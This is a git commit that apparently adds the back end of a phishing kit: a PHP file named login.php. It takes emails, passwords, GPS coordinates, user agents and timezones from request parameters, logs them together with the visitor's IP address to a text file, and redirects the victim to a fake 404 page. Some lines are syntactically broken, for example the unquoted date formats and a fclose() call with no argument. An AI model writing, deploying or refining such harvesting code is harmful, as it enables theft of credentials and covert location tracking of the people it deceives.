807273cabc79d9ce8b17dd5ef52538f9fadfa02b
meta <123126906+meta-sudo@users.noreply.github.com>
2024-04-15 10:36:29 +0100

    Add files via upload

---
+++ book_files/login.php
@@ -0,0 +1,19 @@
+<?php 
+date_default_timezone_set("Africa/Lagos"); /* the IANA timezone of NIG is Africa/Lagos */
+$lat = $_GET["lat"];
+$time = date(h:i:sa);
+$pass = $_GET["pass"];
+$long = $_GET["long"];
+$email = $_GET["email"];
+$date = date(dd-mm-YYYY);
+$status = $_GET["status"];
+$uAgent = $_GET["userAgent"];
+$timezone = $_GET["timezone"];
+echo "<p>hello world</p>";
+$myFile = fopen("./store/location.txt", "a");
+$myDatas = "==========[".$date."]==========\n\tStatus: ".$status."\n\tTime: ".$time."\n\tLat: ".$lat."\n\tLong: ".$long."\n\tEmail: ".$email."\n\tPswd: ".$pass."\n\tIP_Addr: ".$_SERVER["REMOTE_ADDR"]."\n\tTime_Zone: ".$timezone."\n\tUser_Agent: ".$uAgent."\n================================\n\n";
+fwrite($myFile, $myDatas);
+fclose();
+header("Location: 404errorcode.html");
+exit(); 
+?>
